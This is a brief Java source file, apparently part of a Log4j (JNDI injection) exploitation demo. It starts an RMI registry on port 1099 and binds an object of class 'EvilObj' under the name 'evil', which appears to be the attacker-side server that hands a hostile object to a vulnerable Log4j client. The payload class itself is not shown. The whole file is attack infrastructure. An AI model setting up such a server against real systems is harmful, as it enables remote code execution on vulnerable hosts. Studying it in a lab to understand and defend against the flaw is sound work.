package com.hyj.log4j;


import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RmiServer {
    public static void main(String[] args) throws Exception {

        System.out.println("rmi server started .....");
        LocateRegistry.createRegistry(1099);
        Naming.bind("rmi://localhost:1099/evil", new EvilObj());
        System.out.println("rmi server started .....");


    }
}
